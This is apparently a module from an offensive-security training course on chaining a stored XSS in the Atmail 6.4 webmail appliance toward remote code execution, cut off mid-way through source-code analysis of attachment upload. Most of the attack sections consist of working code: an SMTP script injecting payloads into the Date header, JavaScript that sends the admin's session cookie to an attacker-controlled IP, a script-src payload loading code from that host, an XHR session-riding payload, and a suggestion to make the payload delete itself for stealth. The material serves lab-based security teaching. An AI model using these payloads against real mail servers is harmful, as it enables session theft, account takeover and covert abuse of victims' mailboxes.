Atmail Mail Server Appliance: from XSS to RCE
In this module, we will cover the in-depth analysis and exploitation of a stored cross-site scripting (XSS) vulnerability identified in Atmail that can be used to gain access to an authenticated session.

16.1. Overview
After gaining administrative user privileges in the Atmail web interface using the XSS vulnerability, we will then escalate the attack by leveraging the ability to manipulate global configuration settings with the goal of lowering the default security posture of the Atmail web application. This will ultimately allow us to upload arbitrary files, resulting in remote code execution on the target system.

Versions Affected: 6.4 and below

16.1.1. Getting Started
Make sure to revert the Atmail virtual machine from the Labs page before starting this module.

The Atmail Webmail System has two different (but similar) web interfaces: one for webmail and the other for the mail server administration. The following table provides links and credentials for both.

Interface	URL	Username	Password
Webmail	http://atmail/index.php/mail	admin@offsec.local	123456
Webmail	http://atmail/index.php/mail	attacker@offsec.local	123456
Administration	http://atmail/index.php/admin	admin	admin
ssh	ssh://atmail	atmail	V*hUX88cX's%{z:q
MySQL		root	2c924d88
Table 1 - The access credentials

In the examples that follow, the IP address of the Atmail server is mapped to the hostname atmail. Ensure you replace the IP address to match your environment.

While port 443(https) is open on the Atmail server, all of our examples will be using port 80(http). We recommend avoiding port 443 because it uses a self-signed SSL certificate which may interfere with our tools and payloads.

16.1.2. Atmail Vulnerability Discovery
As described by its vendor,1 the Atmail Mail Server appliance is built as a complete messaging platform for any industry type. Atmail contains web interfaces for reading email and server administration, providing a rich web environment and most interestingly, a large attack surface.

In this part of the module, we will start by attempting to detect XSS vulnerabilities with the help of a fuzzing tool.

As with many web application security vulnerabilities, XSS relies on the fact that user input is not properly validated and sanitized.

Since XSS is a client-side vulnerability class however, it can be said that it also requires the web developers to HTML escape all content displayed to the end user. If this sanitization is not implemented or is incomplete, the reflected user input can result in code execution.

Although there are many publicly available XSS fuzzing tools, during our analysis of the Atmail platform, we developed an extensive and easy-to-use XSS fuzzer that targets web-based email clients. Considering that we are targeting a webmail messaging platform, the tool of choice has to be able to send malformed emails to a given mail server using various XSS payloads. A good starting collection of these payloads is the original ha.ckers.org XSS Cheat Sheet,2 which we can build on from additional sources, such as the HTML5 Security Cheat Sheet.3

A fuzzer will typically send mutated data (but well-formed, adhering to a predefined set of rules) to a target endpoint application where it's consumed and sometimes triggers unexpected application states or vulnerable conditions. Our plan is to send emails to the admin email account with malformed fields. Then we will log in to the webmail interface as the admin user and analyze the emails through our web browser to spot any successful XSS injections. We will target this account as we will need administrative access to escalate our attack later on.

Within the provided toolset for this course, you will find our custom-built webmail XSS fuzzer, appropriately named xss-webmail-fuzzer.py. It is important to note that the Atmail SMTP server does not require authentication for relaying of local messages, so we can use it in our fuzzer to send malformed emails. In other words, the Atmail SMTP server is used as the outgoing server within the xss-webmail-fuzzer.py script.

The XSS fuzzer and other Python scripts for this module available on the course's Wiki VM were written in Python 2. Refer back to the "Interacting with Web Listeners using Python" section of the "Tools & Methodologies" module for instructions on how to install Python 2 if it is missing from your Kali VM.

If we were to deliver malformed messages with our fuzzer through an intermediary SMTP server that requires authentication, we would need to pass the appropriate username and password to the script so that we could log in before sending the attack payload.

kali@kali:~$ ./xss-webmail-fuzzer.py

##############################################################
######   XSS WebMail Fuzzer - Offensive Security 2018   ######
##############################################################

Usage: xss-webmail-fuzzer.py -t dest_email -f from_email -s smtpsrv:port [options]

Options:
-h, --help            show this help message and exit
  -t DSTEMAIL, --to=DSTEMAIL
                        Destination Email Address
  -f FRMEMAIL, --from=FRMEMAIL
                        From Email Address
  -s SMTPSRV, --smtp=SMTPSRV
                        SMTP Server
  -c CONN, --conn=CONN  SMTP Connection type (plain,ssl,tls
  -u USERNAME, --user=USERNAME
                        SMTP Username (optional)
  -p PASSWORD, --password=PASSWORD
                        SMTP Password (optional)
  -l FILENAME, --localfile=FILENAME
                        Local XML file
  -r REPLAY, --replay=REPLAY
                        Replay payload number
  -P                    Replace default js alert with a custom payload
  -j INJECTION, --injection-type=INJECTION
                        Available injection methods: basic_main, basic_extra,
                        pinpoint, onebyone_main, onebyone_extra
  -F PINPOINT_FIELD, --injection-field=PINPOINT_FIELD
                        This option must be used together with -j in to
                        specify the E-Mail header to pinpoint. See the
                        EMAIL_HEADERS global variable in the source to obtain
                        a list of possible fields
  -I                    Run onebyone injections in interactive mode
  -L                    Load XML file and show available XSS payloads
Listing 1 - XSS Fuzzer usage

Passing the -L option to xss-webmail-fuzzer.py will display a list of available payloads for the cross-site scripting attacks.

kali@kali:~$ ./xss-webmail-fuzzer.py -L

##############################################################
######   XSS WebMail Fuzzer - Offensive Security 2018   ######
##############################################################

[+] Fetching last XSS cheetsheet from ha.ckers.org ...
[$] Payload 0  : XSS Locator
[$] Payload 1  : XSS Quick Test
[$] Payload 2  : SCRIPT w/Alert()
[$] Payload 3  : SCRIPT w/Source File
[$] Payload 4  : SCRIPT w/Char Code
[$] Payload 5  : BASE
[$] Payload 6  : BGSOUND
[$] Payload 7  : BODY background-image
[$] Payload 8  : BODY ONLOAD
[$] Payload 9  : DIV background-image 1
[$] Payload 10  : DIV background-image 2
[$] Payload 11  : DIV expression
[$] Payload 12  : FRAME
[$] Payload 13  : IFRAME
...
Listing 2 - Listing all available XSS payloads

In order to minimize the number of emails we send and to hopefully uncover a XSS vulnerability quickly, we can start by injecting individual payloads (using the -r option) into common email fields. In the example below, we chose payload number 2 (SCRIPT w/Alert()). Please note that you will need to adjust the mail server IP address accordingly when you replay this attack.

kali@kali:~$ ./xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s atmail -c plain -j onebyone_main -r 2

##############################################################
######   XSS WebMail Fuzzer - Offensive Security 2018   ######
##############################################################

[+] Fetching last XSS cheetsheet from ha.ckers.org ...
[+] Replaying payload 2
[+] Sending email Payload-2-SCRIPT w/Alert()-injectedin-From
[+] Sending email Payload-2-SCRIPT w/Alert()-injectedin-To
[+] Sending email Payload-2-SCRIPT w/Alert()-injectedin-Date
[+] Sending email Payload-2-SCRIPT w/Alert()-injectedin-Subject
[+] Sending email Payload-2-SCRIPT w/Alert()-injectedin-Body
Listing 3 - Sending payload number 2 to each email field

Once the fuzzer has finished sending all applicable payloads, we can log in to the webmail interface to see if any of our emails trigger a popup message indicating that we identified a XSS vulnerability. Fortunately for us, in Figure 1 we can see that we have indeed been successful.

Figure 1: Finding stored XSS using payload 2
Figure 1: Finding stored XSS using payload 2
Given the fact that our fuzzing attempts will generate a large number of emails in the target inbox, we can use the following script to help us clean up the inbox between our fuzzing or attack attempts:

#!/usr/bin/python

import imaplib,sys

if len(sys.argv) != 2:

   print "(+) usage: %s <target>" % sys.argv[0]
   sys.exit(-1)

atmail = sys.argv[1]

print atmail

box = imaplib.IMAP4(atmail, 143)
box.login("admin@offsec.local","123456")
box.select('Inbox')

typ, data = box.search(None, 'ALL')

for num in data[0].split():
   box.store(num, '+FLAGS', '\\Deleted')

box.expunge()
box.close()
box.logout()
Listing 4 - Atmail inbox cleanup script

As a result of our first test, we have discovered that the XSS vulnerability occurs in the Payload-2-SCRIPT w/Alert()-injectedin-Date email, suggesting that the email date field can be injected with JavaScript that is not properly escaped before being reflected in the server response.

Usually, the presence of such a vulnerability means that we are likely to discover more of the same. We can try running the fuzzer again, this time with payload number 13, which contains code for an IFRAME injection.

kali@kali:~$ ./xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s atmail -c plain -j onebyone_main -r 13

##############################################################
######   XSS WebMail Fuzzer - Offensive Security 2018   ######
##############################################################

[+] Fetching last XSS cheetsheet from ha.ckers.org ...
[+] Replaying payload 13
[+] Sending email Payload-13-IFRAME-injectedin-From
[+] Sending email Payload-13-IFRAME-injectedin-To
[+] Sending email Payload-13-IFRAME-injectedin-Date
[+] Sending email Payload-13-IFRAME-injectedin-Subject
[+] Sending email Payload-13-IFRAME-injectedin-Body
Listing 5 - Sending payload number 13 to each email field

Figure 2: Finding stored XSS using payload 13
Figure 2: Finding stored XSS using payload 13
Similar to our first test, more JavaScript popups appear from the Payload-13-IFRAME-injectedin-Body and Payload-13-IFRAME-injectedin-Date payloads, which again suggests insufficient sanitization of these fields.

At this point, we have at least a couple of different injection points and will need to develop a proof of concept script that will allow us to perform our attacks in a more controlled manner. The following script, which will be injecting our various payloads into the Date field, can play that role for us.

#!/usr/bin/python

import smtplib, urllib2, sys

def sendMail(dstemail, frmemail, smtpsrv, payload):
   msg  = "From: attacker@offsec.local\n"
   msg += "To: admin@offsec.local\n"
   msg += "Date: %s\n" % payload
   msg += "Subject: You haz been pwnd\n"
   msg += "Content-type: text/html\n\n"
   msg += "Oh noez, you been had!"
   msg += '\r\n\r\n'
   
   server = smtplib.SMTP(smtpsrv)
   
   try:
       server.sendmail(frmemail, dstemail, msg)
       print "[+] Email sent!"
       
   except Exception, e:
       print "[-] Failed to send email:"
       print "[*] " + str(e)
       
   server.quit()

dstemail = "admin@offsec.local"
frmemail = "attacker@offsec.local"

if not (dstemail and frmemail):
  sys.exit()

if __name__ == "__main__":
   if len(sys.argv) != 3:
       print "(+) usage: %s <server> <js payload>" % sys.argv[0]
       sys.exit(-1)
       
   smtpsrv = sys.argv[1]
   payload = sys.argv[2]
   
   sendMail(dstemail, frmemail, smtpsrv, payload)
Listing 6 - Proof of concept to trigger the XSS vulnerability found in the Date email field

We can then repeat our attack using the following syntax and verify in the admin webmail interface that our script is working as intended:

kali@kali:~$ ./atmail_sendemail.py atmail "<script>alert(1)</script>"
Listing 7 - Replaying a basic XSS payload through our proof of concept

With a proper tool in place, we can now turn our focus to more interesting attacks. One such example would be to steal the administrative session cookie(s) and use them to hijack that session. However, we first need to figure out how to grab the cookies which for now we are only able to display in the victim browser, as shown in Figure 3.

Figure 3: Accessing administrative cookies
Figure 3: Accessing administrative cookies
Exercise
Attempt to replay the attack and display the cookie values using a JavaScript alert box.

1
(atmail, 2020), https://www.atmail.com/on-premises-email/ ↩︎

2
(HTML Purifier, 2017), http://htmlpurifier.org/live/smoketests/xssAttacks.xml ↩︎

3
(Dr.-Ing. Mario Heiderich), http://heideri.ch/jso/#46 ↩︎

16.2. Session Hijacking
Depending on any session protection mechanisms that may be present in the Atmail server, we now may have the ability to steal cookies and session information. This would allow us to impersonate our victim and access their webmail from a different location while bypassing any authentication. This is known as a session hijacking attack1 and is a well known vector while attacking web applications. To implement this attack vector, we can choose either:

the Date field and inject malicious JavaScript code or an HTML IFRAME
the Body field, which only allows for the use of an HTML IFRAME
Recall that these two choices are based on the results of our fuzzing efforts from the previous section.

If we are successful, and we can gain control of a targeted session, we should be able to perform arbitrary actions, all in the role of the legitimate owner of that account. Some of the things we could do are:

Read emails
Send arbitrary emails
Delete any emails
Enable email forwarding (to an email address under our control)
Access all the contacts (used for spamming)
Enable auto-reply
Exploit any authenticated server-side application security flaws
But let's not get ahead of ourselves. At this point we need to see if we can actually retrieve cookies from a remote location and hopefully stay undetected.

In order to make our attack as discrete as possible, the payload we will use in this section will call a JavaScript file named atmail-session.js that is hosted on our attacking system. Once again, please adjust the IP address as needed.

Before we execute the following attack we first need to start a simple web server instance on our attacking machine. We can do that by using the Python module called SimpleHTTPServer.

kali@kali:~/atmail$ python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
Listing 8 - Setting up a simple webserver

The web root for this HTTP Server will be in the current working directory (CWD) where this command was executed. In Listing 8, the web root would be in the atmail directory. We select our payload by using the atmail-sendmail.py Python script:

kali@kali:~$ ./atmail_sendemail.py atmail '<script src="http://192.168.119.120:9090/atmail-session.js"></script>'
Listing 9 - Injecting a JavaScript script reference that will execute in the context of the logged in user

Since the target JavaScript file does not exist yet on our attacking machine, we see a 404 response from our web server.

kali@kali:~/atmail$ python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
192.168.119.120 - - [30/May/2018 10:54:40] code 404, message File not found
192.168.119.120 - - [30/May/2018 10:54:40] "GET /atmail-session.js HTTP/1.1" 404 -
Listing 10 - The webserver responds with a 404 HTTP code as expected.

Our next step is to create a JavaScript file containing the code that allows us to retrieve the session cookies. One way to accomplish this is to once again include a call to our HTTP server, but this time we can append the document.cookie parameter to the URL we are trying to retrieve.

To illustrate this idea, we will create the atmail-session.js file in the webroot directory of our attacking system with the following code (adjust the IP address as necessary):

function addTheImage() {
  var img = document.createElement('img');
  img.src = 'http://192.168.119.120:9090/' + document.cookie;
  document.body.appendChild(img);
}

addTheImage();
Listing 11 - JavaScript code to leak the cookie back to the attacking server

The JavaScript code shown above creates an instance of the Image element and sets the src attribute to point to the attacker's web server, passing the session cookie as a part of the URL string.

Once the payload executes on the victim's browser, we find that the JavaScript code attempted to retrieve a non-existent URL while, at the same time, disclosing the session cookie of the logged in Atmail user (Listing 12).

kali@kali:~/atmail$ python -m SimpleHTTPServer 9090
Serving HTTP on 0.0.0.0 port 9090 ...
192.168.119.120 - - [30/May/2018 11:11:06] "GET /atmail-session.js HTTP/1.1" 200 -
192.168.119.120 - - [30/May/2018 11:11:06] code 404, message File not found
192.168.119.120 - - [30/May/2018 11:11:06] "GET /atmail6=1fp0fjq4aa8sm5if934b62ptv6 HTTP/1.1" 404 -
Listing 12 - Stealing the webmail admin cookie

Now that we have stolen the cookie, we want to ensure that we can hijack the session with it.

First, we clear all the cookies in the browser. This can be done by changing the "Settings for Clearing History" in Firefox in the about:preferences#privacy section as shown in Figure 4.

Figure 4: Clearing browser history
Figure 4: Clearing browser history
Now we can restart Firefox and browse to the mail interface again.

Figure 5: Accessing the Atmail web interface after restarting Firefox
Figure 5: Accessing the Atmail web interface after restarting Firefox
At this point, you should be prompted to login. Let's attempt our session hijacking attack by running the following JavaScript code in the JavaScript console.

Note: Your stolen cookie will be different so you will need to update the value shown in the listing below.

javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6");
Listing 13 - JavaScript code to run in Firefox's JavaScript console.

This will set the cookie (Figure 6) and we can then just refresh the web page to hijack the session (Figure 7)!

Figure 6: Simulating a session hijack
Figure 6: Simulating a session hijack
Figure 7: Bypassing the authentication via session hijacking
Figure 7: Bypassing the authentication via session hijacking
Exercise
Recreate the above attack and make sure you are able to log in to the Atmail web interface with the stolen cookie.

1
(OWASP, 2020), https://www.owasp.org/index.php/Session_hijacking_attack ↩︎

16.3. Session Riding
Since we are targeting an administrative Atmail user, we could have unrestricted access to the application. However, while we have successfully hijacked the admin's Atmail session, we will only be able to impersonate the target user as long as the session is alive. In other words, should the admin user log out, the session cookie will be invalidated and prevent us from accessing the admin's Atmail interface and finishing whatever attack we planned.

Rather than performing our attack from the web browser, a more robust approach would be to automate whatever action we would like to perform as the authenticated user with the help of a script. We could do this, for example, by developing a script on the attacking server that would process the request issued through the XSS vulnerability. The script would extract the cookie from the request and make use of it for the remainder of the attack.

There's another interesting (and easier) option we could explore though. Rather than stealing the cookie, we could leverage the XSS vulnerability to force our authenticated victim to execute whatever action we want. In this way, we would ride the victim session turning our XSS into a cross-site request forgery attack (CSRF).1 CSRF attacks are also known as session riding.

Despite the similar name, it's important to understand the difference between session riding and session hijacking. In the latter, the attacker uses the stolen cookie to perform the attack, while in the former, the victim is performing the attack on the attacker's behalf through a legitimately authenticated browser session.

To automate our attack we can use JavaScript. The XHR API2 can be very useful in these situations as it allows us to establish a bi-directional communication channel between the web application (server) and the victim's session, without the victim having any knowledge of the attack.

1
(OWASP, 2020), https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) ↩︎

2
(W3C, 2016), https://www.w3.org/TR/XMLHttpRequest/ ↩︎

16.3.1. The Attack
While there are a number of actions we could automate, for this exercise we will try to keep things simple and develop a JavaScript payload that will send an email to an address of our choosing from the compromised admin account.

As mentioned in the previous section, the vector will be slightly different as we will leverage the XSS vulnerability in order to perform multiple cross-site request forgery attacks. We will build a more complex and useful payload later in this module based on the steps explained in this section.

Our first step will be to identify the correct URL used to send an email and determine what a normal request looks like.

In order to streamline the proof of concept development process, we will use the Atmail web UI and admin user credentials on our Kali attacking machine alongside our intercepting BurpSuite proxy. This will allow us to simplify our efforts since we will not rely on stolen sessions.

Using an authenticated Atmail session on our Kali machine, we can compose a test email and send it while capturing all generated traffic in BurpSuite. At this point, we are primarily interested in the request that actually tells the Atmail server to process and send our email. In Figure 8 we can see that request.

Figure 8: Discovering the request that will send an email
Figure 8: Discovering the request that will send an email
16.3.2. Minimizing the Request
Our next step is to minimize the request. While this is not a mandatory step, it will help us remove unnecessary components in our final request and help us debug any potential issues along the way by keeping the request as clean as possible.

One option is to do this systematically (i.e. keep deleting parameters, headers, or any other unnecessary data from the request until we are no longer able to successfully send an email). This is where the BurpSuite repeater comes in handy.

The other option in this case is to read the source code, but for the sake of this exercise and since this is not always possible, we will stick with the first approach.

After repeating the minimization process a few times, we are able to turn our original request into the following very small request.

Figure 9: The GET request shown sends an email to whoever we want
Figure 9: The GET request shown sends an email to whoever we want
Getting from the initial request to a much smaller one is not as difficult as it might seem. To recap, the following is the POST request we started with, which sends an email from the web interface to an arbitrary address.

POST /index.php/mail/composemessage/send/tabId/viewmessageTab1 HTTP/1.1
Host: atmail
Content-Length: 338
Accept: application/json, text/javascript, */*
Origin: http://atmail
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://atmail/index.php/mail
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: atmail6=16t8al21shffhdh01e2vvclk96
Connection: close

tabId=viewmessageTab1&composeID=uida25bd740fb&relatedMessageFolder=&relatedMessageUIDs=&relatedMessageMessageId=&relatedMessageResponseType=&relatedDraftUID=&readReceiptRequested=false&emailTo=admin%40offsec.local%3E&emailSubject=test%20email&emailCc=&emailBcc=&emailBodyHtml=%3Cbr%3E%0A%09%09%09%09This+is+a+test+email!
Listing 14 - The original raw request to send an email

And this is our final minimized request we will use going forward:

GET /index.php/mail/composemessage/send/tabId/viewmessageTab1?emailTo=admin%40offsec.local&emailSubject=hacked!&emailBodyHtml=This+is+a+test+email! HTTP/1.1
Host: atmail
Cookie: atmail6=16t8al21shffhdh01e2vvclk96
Listing 15 - The raw GET request that sends an email after it has been minimized

As you may have noticed, in this particular case, we were able to convert the original POST request into a GET request. The easiest way to do so is via the BurpSuite Repeater functionality. By right-clicking the POST request in the Repeater, we are presented with a popup menu that has several options.

Figure 10: Changing the request type in BurpSuite's Repeater
Figure 10: Changing the request type in BurpSuite's Repeater
Selecting Change request method will convert the POST request to a GET request.

Please note that we are not required to change the request method to successfully minimize the request. We are doing so only to demonstrate this BurpSuite functionality. Moreover this conversion is not always possible as it depends on how the web application request handler is implemented. In this instance Atmail accepts both methods for this particular request.

16.3.3. Developing the Session Riding JavaScript Payload
After minimizing the HTTP request, we can now start developing the JavaScript code that will execute this attack in the context of the admin user directly from the victim browser.

In the following example, we are going to send the email to our own email account on the Atmail server (attacker@offsec.local). Please note that this account was created only to better see the outcome of the attack. The attacker obviously does not need an account on the target server.

We will create a new JavaScript file called atmail_sendmail_XHR.js containing the code from Listing 16. If this code executes correctly, it should send an email to the attacker@offsec.local email address on behalf of the admin@offsec.local user. Most importantly, this will all be automated and done without any interaction by the logged-in admin Atmail user.

var email   = "attacker@offsec.local";
var subject = "hacked!";
var message = "This is a test email!";

function send_email()
{
   var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
   var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml= + message;
   
   xhr = new XMLHttpRequest();
   xhr.open("GET", uri + query_string, true);
   xhr.send(null);
}

send_email();
Listing 16 - Code that sends an email to attacker@offsec.local

Note that the code from Listing 16 is implementing the minimized GET request we gathered from the previous section. More importantly, notice how the JavaScript code does not use any cookies. This is because we are simulating the request forgery attack by executing this script from the browser that is already logged in to the Atmail application as admin@offsec.local.

Since the code executes without the need for interaction and the HTTP session is legitimate, we should be able to use this to send our test email from one account to another.

Nevertheless, after testing the code from Listing 16, we noticed that it did not work as expected, since the attacker inbox did not receive any emails from the admin account. While we are developing our payloads, we will inevitably make mistakes and should therefore have at least basic familiarity with a browser's debugging tool. For Firefox we can make use of the built-in Developer\ Tools to figure out what went wrong in our example.

In this particular case, if we look at the Console output while logged in to the admin@offsec.local inbox, we can see that there is a syntax error in our atmail_sendmail_XHR.js file. Specifically, it is located on line 7 and character position 74. If we click on the actual file name listed in the console we can also see the entire JavaScript source code, as well as the highlighted line in question.

Figure 11: Using Firefox Developer Tools to debug our payload issue
Figure 11: Using Firefox Developer Tools to debug our payload issue
Figure 11: Debugging JavaScript payloads using developer tools
Figure 11: Debugging JavaScript payloads using developer tools
Thankfully, this is a simple fix, as we just need to close the double quotes after the emailBodyHtml string. Here is our final atmail_sendemail_XHR.js file:

01: var email   = "attacker@offsec.local";
02: var subject = "hacked!";
03: var message = "This is a test email!";
04: function send_email()
05: {
06:     var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
07:     var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;
08:     xhr = new XMLHttpRequest();
09:     xhr.open("GET", uri + query_string, true);
10:     xhr.send(null);
11: }
12: send_email();
Listing 17 - The JavaScript exploit payload

As a recap, here is a summary of our attack vector:

Send an email to admin@offsec.local with a malicious payload in the Date field, that references a JavaScript file on our attacking server
Create a JavaScript file on our attacking server that will be called by the tag described in step 1
Include code in the JavaScript file that will send an email from admin@offsec.local to attacker@offsec.local
Start the simple Python web server from the same directory where the malicious JavaScript file is located
Log in to the admin@offsec.local account to trigger the XSS
Figure 12: Triggering our XSS attack again with our new send email payload
Figure 12: Triggering our XSS attack again with our new send email payload
After executing the entire attack chain, we can log in and view the attacker's inbox, where the email from the admin user has been received!

Figure 13: A wild email appears!
Figure 13: A wild email appears!
Exercise
Recreate the above XSS attack to send an email from the admin account.

Extra Mile
Once you can send emails, change the payload to create a new contact instead.

Please be aware that you are going to require a web proxy for this exercise and at this point, you should be sufficiently comfortable with BurpSuite.

Once you have completed the previous exercise, enhance the JavaScript payload further to delete itself from the victim’s email inbox. This provides an extra level of stealth and is often used in large-scale XSS worms.

To parse the web server’s response, you can use the response1 property of an XHR object. The following is an example template you can use to assist you in completing this exercise.

function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
       console.log(read_body(xhr));
   }
}
xhr.open('GET', 'http://atmail', true);
xhr.send(null);
Listing 18 - Reading back a server response from a XMLHttpRequest object request

1
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/response ↩︎

16.4. Gaining Remote Code Execution
As attackers, we want to find a way to gain full control of our target, and that means compromising the entire underlying operating system. Of course, one vulnerability alone is not always sufficient. Often, we have to use more than one in the audited application, or even target a different software running on the system.

In the case of Atmail, we know that we can use the XSS vulnerability to hijack the administrative webmail session. However, with a bit of luck, the same XSS vulnerability could also be used to reach the extended administrative functionalities of the application. For this attack vector to work, the administrative user would have to be logged in to both (webmail and admin) interfaces at the same time when the XSS vulnerability is triggered. An attacker would be able to detect if that is the case by the presence of a second session cookie, named atmail6_admin as seen in the figure below.

Figure 11: Atmail administrative cookie.
Figure 11: Atmail administrative cookie.
Being able to reach the administrative interface would greatly expand our attack surface. Moreover, very often the part of the code responsible for the implementation of the administrative functions is the least reviewed and most trusted by application developers and is therefore very interesting from an attacker perspective.

Depending on the nature of the application, developers will at times use a framework that allows a system administrator to extend the functionality of the original application via plugins. In essence this means that anybody with administrative privileges for the application can effectively execute arbitrary code on the system that is hosting the application in question.

A properly designed and protected plugin framework incorporates security boundaries that minimize the inherent risk of executing arbitrary code on a host system. Since the developers of Atmail have not sufficiently protected the plugin deployment process within the web application, crafting a malicious plugin is definitely a viable option in this case.

Figure 14: Atmail supports plugin installation.
Figure 14: Atmail supports plugin installation.
However, we are going to explore the exploitation of another application functionality which, in our opinion, provides us with a more interesting approach to gaining remote code execution on the target system.

16.4.1. Vulnerability Description
The attack vector we will describe is actually a small chain of vulnerabilities that elegantly subverts the logic of the application.

In order to do this, we will make use of two vulnerabilities. The first one weakens the posture of the application via changes to the global settings of the application, and the second one makes use of this weakened posture to upload malicious PHP code. In essence, we are:

Changing the global settings of the application (requires administrative access)
Uploading a file via an email attachment (requires mail user access)
Accessing the uploaded file so that it is executed by the server (requires no privileges)
In order to properly identify and understand the vulnerabilities used in this section, we will need to dive into the source code of Atmail.

16.4.2. The addattachmentAction Vulnerability Analysis
Since we are targeting an email application and the ability to send attachments is one of the most fundamental functions an email platform needs to support, we should already have the ability to upload arbitrary files to the Atmail server. The question, however, is this: what security mechanisms does Atmail use to prevent a user from uploading AND executing malicious files, regardless of their type?

In order to better understand this, we first captured a normal HTTP POST request that is triggered when a user attaches a file to an email in the web UI.

POST /index.php/mail/composemessage/addattachment/composeID/uidb6994f2d9d HTTP/1.1
Host: atmail
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://atmail/index.php/mail
Cookie: atmail6=1a508uf9bdaa9f2g66gkdhtls5; atmail6_admin=bv0c49q96e4e9sp10cmsc6d780
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1516032960449973684759015284
Content-Length: 242

-----------------------------1516032960449973684759015284
Content-Disposition: form-data; name="newAttachment"; filename="atmail.txt"
Content-Type: text/plain

TESTING ATMAIL

-----------------------------1516032960449973684759015284--
Listing 19 - A typical POST request when attaching a file to an email.

We then searched for any occurrence of the word "addattachment", which is part of the URL (Listing 19), in the Atmail code base using the following command:

[atmail@atmail ~]$ grep -r "function addattachment" /usr/local/atmail --color 2>/dev/null 
/usr/local/atmail/webmail/application/modules/mail/controllers/ComposemessageController.php:	public function addattachmentAction()
Listing 20 - Searching for the "addattachment" string on the Atmail server.

As a result, we discovered the implementation of attachment handling logic in the /usr/local/atmail/webmail/application/modules/mail/controllers/ComposemessageController.php file:

1129:   public function addattachmentAction()
1130:   {
1131: 
1132:       $this->_helper->viewRenderer->setNoRender();
1133: 
1134:       $requestParams = $this->getRequest()->getParams();
1135: 
1136:       $type = str_replace('/', '_', $_FILES['newAttachment']['type']);
1137:       $filenameOriginal = urldecode( $_FILES['newAttachment']['name'] ); 
1138:         $filenameOriginal = preg_replace("/^[\/.]+/", "", $filenameOriginal); 
1139:         $filenameOriginal = str_replace("../", "", $filenameOriginal); 
1140:         
1141:       $filenameFS = $type . '-' . $requestParams['composeID'] . '-' . $filenameOriginal; 
1142:         
1143:       $filenameFSABS = APP_ROOT . users::getTmpFolder() . $filenameFS;
1144:         
1145:         // Make sure the file will be saved to the user's tmp folder
1146:         if (realpath(dirname($filenameFSABS)) != realpath(APP_ROOT . users::getTmpFolder())) {
1147:             echo $this->view->translate("illegal filename");
1148:             return;
1149:         }
1150:         
1151:       if ( $_FILES["newAttachment"]["error"] == UPLOAD_ERR_OK )
1152:       {
1153:                         
1154:           if ( !@move_uploaded_file($_FILES['newAttachment']['tmp_name'], $filenameFSABS) )
Listing 21 - The code responsible for file attachment handling

If we look carefully at the code in Listing 21, we can see a couple of things that are of interest to us. First, on line 1137, we see that the filenameOriginal variable is set using the user-controlled file name1 (refer to the name POST variable in Listing 19).

More importantly, on lines 1138 and 1139, we see that the Atmail developers were mindful of file names starting with one or two dots, which could be used to overwrite files like .htaccess and/or perform directory traversal attacks.

It’s interesting to note that the check on line 1139 does not look for "..\". This means that if this software was deployed on a Windows operating system, then this check could probably be bypassed.

On line 1141, we see that a new variable called filenameFS is created and that it partially consists of the filenameOriginal variable. Then, on line 1143 the filenameFS variable is concatenated into a variable called filenameFSABS along with the result of the function call to users::getTmpFolder().

Let's investigate that function. Inside of /usr/local/atmail/webmail/application/models/users.php we see the rather lengthy implementation of getTmpFolder:

117:    /** 
118:     * @returns user tmp folder name, (Config) tmpFolderBaseName . (FS Safe) Account
119:     */
120:    public static function getTmpFolder( $subFolder = '', $user = null )
121:    {
122:        
123:        $globalConfig = Zend_Registry::get('config')->global;
124:        if( !isset($globalConfig['tmpFolderBaseName']) )
125:        {
126:            
127:            throw new Atmail_Mail_Exception('Compulsory tmpFolderBaseName not found in Config');
128:            
129:        }
130:        $tmp_dir = $globalConfig['tmpFolderBaseName']; // 1.
131:        $userData = null;
132:        if($user == null)
133:        {
134:            $userData = Zend_Auth::getInstance()->getStorage()->read();
135:            if(is_array($userData) && isset($userData['user']))
136:            {
137:                $safeUser = simplifyString($userData['user']); // 2.
138:            }
139:            else
140:            {
141:                // something went wrong.
142:                // return global temp directory
143:                return APP_ROOT . 'tmp/';
144:            }
145:        }
146:        else
147:        {
148:            $safeUser = simplifyString($user); 
149:        }
150:        $accountFirstLetter = $safeUser[0]; // 3.
151:        $accountSecondLetter = $safeUser[1]; // 4.
152:        $range = range('a,','z');
153:        if(!in_array($accountFirstLetter, $range))
154:        {
155:            $accountFirstLetter = 'other';
156:        }
157:        
158:        if(!in_array($accountSecondLetter, $range))
159:        {
160:            $accountSecondLetter = 'other';
161:        }
162:        
163:        if( !is_dir(APP_ROOT . $tmp_dir) )
164:            $tmp_dir = '';
165:        
166:        $tmp_dir .= $accountFirstLetter . DIRECTORY_SEPARATOR;
167:        if( !is_dir(APP_ROOT . $tmp_dir) )
168:        {
169:            
170:            @mkdir(APP_ROOT . $tmp_dir);
